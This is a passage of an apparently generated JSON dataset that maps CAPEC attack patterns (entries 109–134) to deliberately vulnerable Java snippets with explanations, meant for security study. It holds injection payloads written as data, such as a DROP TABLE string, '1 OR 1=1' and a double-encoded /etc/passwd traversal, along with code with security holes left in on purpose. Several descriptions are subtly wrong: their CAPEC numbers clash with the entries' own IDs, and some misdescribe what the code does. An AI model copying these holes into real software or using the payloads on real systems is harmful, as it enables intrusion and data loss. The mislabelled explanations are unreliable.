        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class VulnerableSQLInjection {\n    public static void main(String[] args) {\n        String userInput = \"'; DROP TABLE users; --\"; // Simulated malicious input\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try {\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"user\", \"password\");\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n\n            while (rs.next()) {\n                String command = rs.getString(\"command\");\n                Runtime.getRuntime().exec(command); // Vulnerable to OS Command Injection\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can inject SQL commands through user input, leading to SQL Injection (CWE-89). The injected SQL command is used to fetch data from the database, which is then executed as an OS command without proper validation (CWE-78). This represents the CAPEC scenario where malicious data is injected into the database and later used as command line arguments, leading to command execution on the host. The code does not neutralize special elements in the SQL command or the OS command, making it susceptible to both SQL Injection and OS Command Injection."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "import org.hibernate.Session;\nimport org.hibernate.query.Query;\n\npublic class ORMInjectionExample {\n    public void getUserData(Session session, String userId) {\n        // Vulnerable code: directly using user input in HQL query\n        String hql = \"FROM User WHERE id = '\" + userId + \"'\";\n        Query query = session.createQuery(hql);\n        User user = (User) query.uniqueResult();\n        System.out.println(user);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to Object Relational Mapping (ORM) Injection using Hibernate. The method `getUserData` takes a Hibernate `Session` and a `userId` as input. It constructs an HQL (Hibernate Query Language) query by directly concatenating the `userId` into the query string. This approach is vulnerable to SQL injection because an attacker can manipulate the `userId` input to alter the query's logic or execute arbitrary SQL commands. The code embodies the main idea of CAPEC-20, CAPEC-89, CAPEC-564, CAPEC-943, and CAPEC-1083 by showing improper input validation and improper neutralization of special elements in the data query logic, leading to potential SQL injection attacks."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "import javax.xml.soap.*;\nimport java.sql.*;\n\npublic class SOAPSQLInjectionExample {\n    public static void main(String[] args) throws Exception {\n        // Simulate receiving a SOAP message\n        String soapMessage = \"<soap:Envelope xmlns:soap=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"><soap:Body><getUser><id>1 OR 1=1</id></getUser></soap:Body></soap:Envelope>\";\n\n        // Parse the SOAP message\n        SOAPMessage message = MessageFactory.newInstance().createMessage(null, new java.io.ByteArrayInputStream(soapMessage.getBytes()));\n        SOAPBody body = message.getSOAPBody();\n        String userId = body.getElementsByTagName(\"id\").item(0).getTextContent();\n\n        // Vulnerable SQL query construction\n        String query = \"SELECT * FROM users WHERE id = \" + userId;\n\n        // Database connection setup (example, not secure)\n        Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"user\", \"password\");\n        Statement stmt = conn.createStatement();\n\n        // Execute the query\n        ResultSet rs = stmt.executeQuery(query);\n\n        // Process the result set\n        while (rs.next()) {\n            System.out.println(\"User: \" + rs.getString(\"username\"));\n        }\n\n        // Close resources\n        rs.close();\n        stmt.close();\n        conn.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a SQL injection vulnerability through SOAP parameter tampering. The code simulates receiving a SOAP message containing a user ID parameter, which is then parsed and directly used to construct an SQL query without proper validation or parameter binding. This allows an attacker to inject malicious SQL code through the SOAP message, potentially gaining unauthorized access to the database. The code highlights the importance of proper input validation and the use of prepared statements to prevent SQL injection attacks."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\npublic class VulnerableJSONServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        response.setContentType(\"application/json\");\n        PrintWriter out = response.getWriter();\n\n        // Simulated sensitive data\n        String sensitiveData = \"{\\\"user\\\": \\\"admin\\\", \\\"email\\\": \\\"admin@example.com\\\"}\";\n\n        // No origin validation\n        out.print(sensitiveData);\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to JSON Hijacking. The servlet responds to GET requests by sending JSON data containing sensitive information without verifying the origin of the request. This lack of origin validation (CWE-346) allows an attacker to include and execute this JSON data in the context of another website, exploiting the browser's Same Origin Policy loophole. The code also does not verify the authenticity of the data (CWE-345), making it susceptible to Cross-Site Request Forgery (CWE-352) and Cross-Site Scripting (CWE-79) attacks. Additionally, it relies on client-side enforcement of security (CWE-602), which is insufficient for protecting sensitive data."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "import java.util.Random;\n\npublic class WeakAuthentication {\n    private static final int MAX_ATTEMPTS = 1000;\n    private static final String SECRET = \"password123\";\n    private static final Random random = new Random();\n\n    public static void main(String[] args) {\n        for (int i = 0; i < MAX_ATTEMPTS; i++) {\n            String attempt = generateRandomPassword();\n            if (authenticate(attempt)) {\n                System.out.println(\"Access granted with password: \" + attempt);\n                return;\n            }\n        }\n        System.out.println(\"Access denied after \" + MAX_ATTEMPTS + \" attempts.\");\n    }\n\n    private static boolean authenticate(String password) {\n        return SECRET.equals(password);\n    }\n\n    private static String generateRandomPassword() {\n        int length = 10;\n        StringBuilder password = new StringBuilder(length);\n        for (int i = 0; i < length; i++) {\n            password.append((char) (random.nextInt(26) + 'a'));\n        }\n        return password.toString();\n    }\n}",
        "description": "This Java code snippet demonstrates a weak authentication mechanism vulnerable to brute force attacks. The `authenticate` method checks if a given password matches a hardcoded secret (`SECRET`). The `main` method attempts to brute force the password by generating random passwords up to a maximum number of attempts (`MAX_ATTEMPTS`). The `generateRandomPassword` method creates a random 10-character password using insufficiently random values. This code embodies the main idea of the CAPEC by showing how an attacker could use trial-and-error to guess the password, exploiting weaknesses such as insufficiently random values (CWE-330), weak password requirements (CWE-521), and improper restriction of excessive authentication attempts (CWE-307)."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class InterfaceManipulationExample {\n    private static final String DEBUG_MODE_FILE = \"/sys/hardware/debug_mode\";\n    private static final String REGISTER_FILE = \"/sys/hardware/register\";\n\n    public static void main(String[] args) {\n        try {\n            // Improper access control to debug mode\n            enableDebugMode();\n\n            // Improper access control to register interface\n            manipulateRegister();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void enableDebugMode() throws IOException {\n        // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n        Files.write(Paths.get(DEBUG_MODE_FILE), \"1\".getBytes());\n        System.out.println(\"Debug mode enabled.\");\n    }\n\n    private static void manipulateRegister() throws IOException {\n        // CWE-1262: Improper Access Control for Register Interface\n        String registerValue = new String(Files.readAllBytes(Paths.get(REGISTER_FILE)));\n        System.out.println(\"Current register value: \" + registerValue);\n        Files.write(Paths.get(REGISTER_FILE), \"new_value\".getBytes());\n        System.out.println(\"Register value manipulated.\");\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of interface manipulation by showing how an adversary might exploit improper access controls to manipulate hardware interfaces. The `enableDebugMode` method represents CWE-1313, where the hardware allows activation of debug logic at runtime, potentially altering the system's behavior. The `manipulateRegister` method represents CWE-1262, where improper access control to a register interface allows unauthorized manipulation of hardware registers. Both methods illustrate how an attacker could bypass access controls and execute unintended functionality, compromising the system's security."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class AuthenticationService {\n    private Map<String, String> users = new HashMap<>();\n    private int failedAttempts = 0;\n    private static final int MAX_ATTEMPTS = 5;\n\n    public AuthenticationService() {\n        // Adding a user with username 'admin' and password 'password'\n        users.put(\"admin\", \"password\");\n    }\n\n    public boolean authenticate(String username, String password) {\n        if (failedAttempts >= MAX_ATTEMPTS) {\n            System.out.println(\"Account locked due to too many failed attempts.\");\n            return false;\n        }\n\n        if (users.containsKey(username) && users.get(username).equals(password)) {\n            failedAttempts = 0; // Reset failed attempts on successful login\n            return true;\n        } else {\n            failedAttempts++;\n            return false;\n        }\n    }\n\n    public static void main(String[] args) {\n        AuthenticationService authService = new AuthenticationService();\n\n        // Simulating authentication attempts\n        System.out.println(authService.authenticate(\"admin\", \"wrongpassword\")); // false\n        System.out.println(authService.authenticate(\"admin\", \"wrongpassword\")); // false\n        System.out.println(authService.authenticate(\"admin\", \"wrongpassword\")); // false\n        System.out.println(authService.authenticate(\"admin\", \"wrongpassword\")); // false\n        System.out.println(authService.authenticate(\"admin\", \"wrongpassword\")); // false\n        System.out.println(authService.authenticate(\"admin\", \"password\")); // false, account locked\n    }\n}",
        "description": "This Java code snippet represents an authentication service that is vulnerable to authentication abuse. The service maintains a list of users with their passwords and allows authentication attempts. However, it has several weaknesses:\n\n1. **Improper Authentication (CWE-287)**: The authentication mechanism simply checks if the provided username and password match the stored values without any additional verification.\n2. **Improper Restriction of Excessive Authentication Attempts (CWE-307)**: The service locks the account after a fixed number of failed attempts, but this is a simplistic approach and can be bypassed or exploited.\n3. **Weak Authentication (CWE-1390)**: The use of a simple username-password pair without additional security measures (e.g., multi-factor authentication) makes the system vulnerable.\n\nThe code demonstrates how an attacker could exploit these weaknesses by repeatedly attempting to authenticate with incorrect passwords, eventually locking the account and potentially causing a denial of service or other issues."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "import java.util.Scanner;\n\npublic class AuthBypassExample {\n    private static boolean isAuthenticated = false;\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        // Improper Authentication: No actual verification of credentials\n        if (username.equals(\"admin\")) {\n            isAuthenticated = true;\n        }\n\n        if (isAuthenticated) {\n            System.out.println(\"Access granted. Welcome, \" + username + \"!\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an authentication bypass vulnerability. The code prompts the user to enter a username and password, but it only checks if the username is 'admin' to grant access, without verifying the password. This represents CWE-287 (Improper Authentication) and CWE-1390 (Weak Authentication), as the authentication mechanism does not sufficiently prove the claimed identity. An attacker can easily bypass the authentication by simply entering 'admin' as the username, regardless of the password, thereby gaining unauthorized access."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "import java.io.*;\nimport java.util.*;\n\npublic class SensitiveInfoExposure {\n    public static void main(String[] args) {\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        Properties config = new Properties();\n        try (InputStream input = new FileInputStream(\"config.properties\")) {\n            config.load(input);\n            String sensitiveData = config.getProperty(\"sensitiveData\");\n            System.out.println(\"Sensitive Data: \" + sensitiveData); // Exposing sensitive data\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n\n        // CWE-426: Untrusted Search Path\n        try {\n            Process process = Runtime.getRuntime().exec(\"untrusted_path/program\");\n            process.waitFor();\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Excavation' by actively probing and exposing sensitive information. The code reads sensitive data from a configuration file and prints it to the console, representing CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor). Additionally, it executes a program from an untrusted search path, representing CWE-426 (Untrusted Search Path). This combination illustrates how an adversary might exploit these weaknesses to gather sensitive information and execute malicious code."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class CleartextTransmission {\n    public static void main(String[] args) {\n        String serverAddress = \"example.com\";\n        int port = 80;\n        try (Socket socket = new Socket(serverAddress, port);\n             OutputStream out = socket.getOutputStream();\n             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\n\n            // Sending sensitive information in cleartext\n            String sensitiveData = \"username=admin&password=admin123\";\n            out.write((\"POST /login HTTP/1.1\\r\\n\" +\n                       \"Host: \" + serverAddress + \"\\r\\n\" +\n                       \"Content-Length: \" + sensitiveData.length() + \"\\r\\n\" +\n                       \"Content-Type: application/x-www-form-urlencoded\\r\\n\\r\\n\" +\n                       sensitiveData).getBytes());\n            out.flush();\n\n            // Reading the response\n            String responseLine;\n            while ((responseLine = in.readLine()) != null) {\n                System.out.println(responseLine);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the transmission of sensitive information (username and password) in cleartext over an HTTP connection. The code connects to a server using a socket, sends a POST request with sensitive data in the body, and reads the server's response. This example embodies the CAPEC-158 'Interception' attack pattern, where an adversary can monitor the data stream to gather sensitive information. The code is vulnerable to CWE-319 'Cleartext Transmission of Sensitive Information' because it transmits sensitive data without encryption, making it susceptible to interception by unauthorized actors."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "import java.net.URLDecoder;\nimport java.nio.charset.StandardCharsets;\n\npublic class DoubleEncodingExample {\n    public static void main(String[] args) {\n        String input = \"%252E%252E%252F%252E%252E%252Fetc%252Fpasswd\"; // Double encoded payload\n        String decodedOnce = URLDecoder.decode(input, StandardCharsets.UTF_8);\n        String decodedTwice = URLDecoder.decode(decodedOnce, StandardCharsets.UTF_8);\n\n        // Improper handling of double encoding\n        if (decodedTwice.contains(\"../\")) {\n            System.out.println(\"Potential Path Traversal Attack detected!\");\n        } else {\n            System.out.println(\"Input is safe.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of double encoding, where an input string is encoded twice to bypass security filters. The input string \"%252E%252E%252F%252E%252E%252Fetc%252Fpasswd\" represents a double-encoded path traversal attack payload. The code decodes the input string twice using `URLDecoder.decode` and then checks if the decoded string contains the sequence \"../\", which is indicative of a path traversal attempt. The code highlights the vulnerability where improper handling of double encoding can lead to security issues, such as path traversal attacks. This example is related to several CWEs, including improper handling of URL encoding (CWE-177), improper input validation (CWE-20), and improper neutralization of special elements (CWE-74)."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "public class ProductionSystem {\n    private boolean debugMode = true; // CWE-489: Active Debug Code\n\n    public void processRequest(String request) {\n        if (debugMode) {\n            System.out.println(\"Debug Info: Processing request: \" + request); // CWE-1295: Debug Messages Revealing Unnecessary Information\n        }\n        // Process the request\n    }\n\n    public static void main(String[] args) {\n        ProductionSystem system = new ProductionSystem();\n        system.processRequest(\"Sample Request\");\n    }\n}",
        "description": "This Java code snippet represents a production system with an active debug mode, which is a common vulnerability described in CAPEC-489. The 'debugMode' flag is set to true, indicating that debug code is still enabled in the production environment. When a request is processed, debug information is printed to the console, revealing potentially sensitive information (CWE-1295). This code exemplifies the risk of leaving non-production interfaces, such as debug code, enabled in a production system, which can be exploited by adversaries to gain unauthorized information or functionality."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "public class PrivilegeAbuseExample {\n    private boolean isAdmin;\n    private String sensitiveData = \"Top Secret Data\";\n\n    public PrivilegeAbuseExample(boolean isAdmin) {\n        this.isAdmin = isAdmin;\n    }\n\n    public String getSensitiveData() {\n        // CWE-284: Improper Access Control\n        // CWE-269: Improper Privilege Management\n        if (isAdmin) {\n            return sensitiveData;\n        } else {\n            // CWE-732: Incorrect Permission Assignment for Critical Resource\n            return \"Access Denied\";\n        }\n    }\n\n    public static void main(String[] args) {\n        PrivilegeAbuseExample user = new PrivilegeAbuseExample(false);\n        System.out.println(user.getSensitiveData()); // Should print \"Access Denied\"\n\n        PrivilegeAbuseExample admin = new PrivilegeAbuseExample(true);\n        System.out.println(admin.getSensitiveData()); // Should print \"Top Secret Data\"\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of privilege abuse. The `PrivilegeAbuseExample` class has a boolean field `isAdmin` to indicate whether the user is an administrator. The `getSensitiveData` method checks if the user is an admin before returning sensitive data. If the user is not an admin, it returns 'Access Denied'. This snippet highlights the importance of proper access control (CWE-284) and privilege management (CWE-269). The code also touches on incorrect permission assignment (CWE-732) by ensuring that only admins can access the sensitive data."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "public class BufferManipulationExample {\n    public static void main(String[] args) {\n        int bufferSize = 10;\n        char[] buffer = new char[bufferSize];\n        String input = \"This input is too long for the buffer\";\n\n        // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n        for (int i = 0; i <= input.length(); i++) {\n            buffer[i] = input.charAt(i); // Potential buffer overflow\n        }\n\n        // CWE-126: Buffer Over-read\n        for (int i = 0; i <= bufferSize; i++) {\n            System.out.print(buffer[i]); // Potential buffer over-read\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer manipulation vulnerability by improperly handling buffer boundaries. The code initializes a buffer of size 10 and attempts to copy a longer input string into it, leading to a buffer overflow (CWE-119). Additionally, it reads beyond the buffer's bounds, causing a buffer over-read (CWE-126). This example embodies the main idea of CAPEC-1000, where an adversary manipulates buffer interactions to read or modify unintended memory locations."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "import java.util.concurrent.locks.ReentrantLock;\n\npublic class SharedResourceManipulation {\n    private static int sharedResource = 0;\n    private static ReentrantLock lock = new ReentrantLock();\n\n    public static void main(String[] args) {\n        Thread thread1 = new Thread(() -> manipulateResource());\n        Thread thread2 = new Thread(() -> manipulateResource());\n\n        thread1.start();\n        thread2.start();\n    }\n\n    public static void manipulateResource() {\n        for (int i = 0; i < 1000; i++) {\n            if (lock.tryLock()) {\n                try {\n                    // Critical section\n                    sharedResource++;\n                    System.out.println(\"Shared Resource: \" + sharedResource);\n                } finally {\n                    lock.unlock();\n                }\n            } else {\n                // Failed to acquire lock, potential for improper synchronization\n                sharedResource++;\n                System.out.println(\"[Unsafe] Shared Resource: \" + sharedResource);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a shared resource (an integer variable) is manipulated by multiple threads. The `ReentrantLock` is used to synchronize access to the shared resource. However, the `tryLock` method is used, which may fail to acquire the lock, leading to potential improper synchronization (CWE-662). This can result in simultaneous access to the shared resource, causing inconsistent or corrupted data. This example embodies the main idea of CAPEC-Shared Resource Manipulation, where an adversary could exploit such a vulnerability to affect the behavior of the application."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class FloodingVulnerableServer {\n    private static final int PORT = 8080;\n    private static final int MAX_THREADS = 1000; // No limit on the number of threads\n\n    public static void main(String[] args) {\n        ExecutorService executor = Executors.newFixedThreadPool(MAX_THREADS);\n        try (ServerSocket serverSocket = new ServerSocket(PORT)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                executor.submit(() -> handleRequest(clientSocket));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleRequest(Socket clientSocket) {\n        try {\n            // Simulate handling request\n            Thread.sleep(1000);\n            clientSocket.close();\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that is vulnerable to a flooding attack. The server uses a fixed thread pool with a high maximum number of threads (MAX_THREADS) to handle incoming client connections. However, it does not impose any restrictions on the number of connections it accepts, nor does it implement any rate limiting or resource throttling mechanisms. This can lead to resource exhaustion (CWE-400) as the server can be overwhelmed by a large number of requests in a short period of time. Additionally, the server does not properly release resources (CWE-404) and does not have sufficient control over the allocation of resources (CWE-770), making it susceptible to denial of service attacks."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "import java.io.*;\n\npublic class PathTraversalExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PathTraversalExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        String basePath = \"/var/www/uploads/\";\n        File file = new File(basePath + filename);\n\n        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a path traversal vulnerability. The program takes a filename as a command-line argument and attempts to read and print the contents of the file located in the '/var/www/uploads/' directory. However, it does not properly validate or sanitize the input filename, allowing an attacker to use sequences like '../' to traverse directories and access files outside the intended directory. For example, an attacker could provide '../../etc/passwd' as the filename to read the system's password file. This code embodies the main idea of the CAPEC by showing how insufficient input validation can lead to unauthorized file access."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class DirectoryListingServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String dirPath = request.getParameter(\"dir\");\n        if (dirPath == null || dirPath.isEmpty()) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Directory path is required\");\n            return;\n        }\n\n        File dir = new File(dirPath);\n        if (!dir.exists() || !dir.isDirectory()) {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \"Directory not found\");\n            return;\n        }\n\n        String[] files = dir.list();\n        if (files != null) {\n            response.setContentType(\"text/plain\");\n            for (String file : files) {\n                response.getWriter().println(file);\n            }\n        } else {\n            response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, \"Unable to list directory contents\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation of directory listing. The servlet takes a directory path as a request parameter and lists the contents of the specified directory. The code does not perform proper authorization checks (CWE-285), does not protect against unauthorized access to sensitive directories (CWE-424, CWE-425), and may expose critical files due to incorrect permissions (CWE-732, CWE-276). This can lead to an attacker gaining access to sensitive information and files, which can be used for further attacks. The code embodies the main idea of CAPEC-126 (Directory Indexing) by allowing an adversary to explore the directory tree and learn the names of files."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "public class IntegerAttackExample {\n    public static void main(String[] args) {\n        int maxValue = Integer.MAX_VALUE;\n        int result = maxValue + 1; // Integer overflow\n        System.out.println(\"Result: \" + result);\n\n        int negativeValue = -1;\n        int extendedValue = (short) negativeValue; // Unexpected sign extension\n        System.out.println(\"Extended Value: \" + extendedValue);\n\n        int value = 100;\n        if (value <= 200) { // Missing minimum check\n            System.out.println(\"Value is within range.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several integer-related vulnerabilities. First, it shows an integer overflow by adding 1 to Integer.MAX_VALUE, resulting in a negative number due to wraparound (CWE-190). Second, it illustrates unexpected sign extension by casting a negative integer to a short, which can lead to unexpected values (CWE-194). Finally, it includes a numeric range comparison without a minimum check, only verifying that the value is less than or equal to a maximum (CWE-839). These examples highlight how improper handling of integer operations can lead to unexpected and potentially dangerous behavior in applications."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "public class PointerManipulationExample {\n    public static void main(String[] args) {\n        int[] array = new int[10];\n        int index = getIndexFromUntrustedSource(); // CWE-822: Untrusted Pointer Dereference\n        \n        // CWE-823: Use of Out-of-range Pointer Offset\n        if (index >= 0 && index < array.length) {\n            array[index] = 42; // Safe access\n        } else {\n            // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n            // CWE-476: NULL Pointer Dereference\n            int[] unsafeArray = null;\n            unsafeArray[index] = 42; // Unsafe access, potential NULL pointer dereference\n        }\n    }\n\n    private static int getIndexFromUntrustedSource() {\n        // Simulate getting an index from an untrusted source\n        return 15; // Out-of-bounds index for demonstration\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where pointer manipulation vulnerabilities can occur. The `getIndexFromUntrustedSource` method simulates obtaining an index from an untrusted source (CWE-822). The code then checks if the index is within the bounds of the array (CWE-823). If the index is out of bounds, it attempts to access an array using this invalid index, which can lead to improper memory access (CWE-119) and potentially dereferencing a NULL pointer (CWE-476). This example highlights the risks associated with pointer manipulation and the importance of validating indices before using them."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "import java.util.ArrayList;\nimport java.util.List;\n\npublic class ExcessiveAllocationExample {\n    private List<byte[]> memoryHog = new ArrayList<>();\n\n    public void allocateExcessiveMemory(int numAllocations, int sizePerAllocation) {\n        for (int i = 0; i < numAllocations; i++) {\n            memoryHog.add(new byte[sizePerAllocation]);\n        }\n    }\n\n    public static void main(String[] args) {\n        ExcessiveAllocationExample example = new ExcessiveAllocationExample();\n        // This will allocate a large amount of memory, potentially causing resource exhaustion\n        example.allocateExcessiveMemory(1000, 1024 * 1024); // 1000 MB allocations\n    }\n}",
        "description": "This Java code snippet demonstrates an excessive allocation vulnerability. The `allocateExcessiveMemory` method allocates a large amount of memory by creating a specified number of byte arrays of a given size and adding them to a list. In the `main` method, this function is called with parameters that cause the program to allocate 1000 MB of memory. This can lead to resource exhaustion, as the program does not impose any limits on the number or size of allocations, embodying the main idea of CAPEC-130 (Excessive Allocation) and related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-400 (Uncontrolled Resource Consumption)."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class ResourceLeakExample {\n    public void readFile(String filePath) {\n        BufferedReader reader = null;\n        try {\n            reader = new BufferedReader(new FileReader(filePath));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            // Improper resource shutdown or release\n            // Missing release of resource after effective lifetime\n            // This can lead to resource leak\n            // if (reader != null) { reader.close(); } should be here\n        }\n    }\n\n    public static void main(String[] args) {\n        ResourceLeakExample example = new ResourceLeakExample();\n        example.readFile(\"example.txt\");\n    }\n}",
        "description": "This Java code snippet demonstrates a resource leak vulnerability. The `readFile` method opens a file and reads its contents line by line using a `BufferedReader`. However, the `BufferedReader` is not properly closed in the `finally` block, which can lead to a resource leak. This embodies the CAPEC 'Resource Leak Exposure' by not releasing the file resource, thus depleting the quantity of the resource available to service legitimate requests. The related CWEs are represented as follows: CWE-404 (Improper Resource Shutdown or Release) and CWE-772 (Missing Release of Resource after Effective Lifetime). Properly closing the `BufferedReader` in the `finally` block would mitigate this issue."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class SymlinkAttackExample {\n    public static void main(String[] args) {\n        String userInputPath = \"/tmp/user_input\"; // This should be sanitized and validated\n        try {\n            // Check if the file exists and is not a symbolic link\n            Path path = Paths.get(userInputPath);\n            if (Files.exists(path) && !Files.isSymbolicLink(path)) {\n                // Open the file for reading\n                BufferedReader reader = new BufferedReader(new FileReader(userInputPath));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(line);\n                }\n                reader.close();\n            } else {\n                System.out.println(\"Invalid file path or symbolic link detected.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability to a symlink attack. The code attempts to read a file specified by a user-provided path. It first checks if the file exists and is not a symbolic link before opening it. However, this check is insufficient because it does not account for race conditions (CWE-363) where an attacker could replace the file with a symbolic link between the check and the file access. Additionally, the code does not properly sanitize or validate the user input (CWE-73), which could lead to unauthorized file access. This snippet embodies the main idea of a symlink attack (CAPEC-59) by showing how improper link resolution and external control of file paths can lead to security vulnerabilities."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "public class Application {\n    public static void main(String[] args) {\n        for (String arg : args) {\n            switch (arg) {\n                case \"--debug\":\n                    enableDebugMode();\n                    break;\n                case \"--verbose\":\n                    enableVerboseMode();\n                    break;\n                case \"--hidden\":\n                    enableHiddenFunctionality();\n                    break;\n                default:\n                    System.out.println(\"Unknown option: \" + arg);\n            }\n        }\n    }\n\n    private static void enableDebugMode() {\n        System.out.println(\"Debug mode enabled\");\n        // Debug information that might reveal sensitive data\n    }\n\n    private static void enableVerboseMode() {\n        System.out.println(\"Verbose mode enabled\");\n        // Verbose logging\n    }\n\n    private static void enableHiddenFunctionality() {\n        System.out.println(\"Hidden functionality enabled\");\n        // Hidden functionality that should not be accessible\n    }\n}",
        "description": "This Java code snippet represents an application that processes command-line arguments to enable various modes, including a hidden functionality mode. The main idea of the CAPEC 'Try All Common Switches' is embodied by the indiscriminate invocation of command-line options to discover weaknesses. The code includes a hidden functionality option ('--hidden') that is not documented or intended for public use, representing CWE-912 (Hidden Functionality). The debug mode ('--debug') can reveal sensitive information, and the verbose mode ('--verbose') increases logging verbosity. The code does not handle errors or unexpected inputs robustly, which can lead to CWE-184 (Incomplete List of Disallowed Inputs) and CWE-391 (Unchecked Error Condition). This snippet demonstrates how an attacker might exploit such switches to uncover vulnerabilities."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
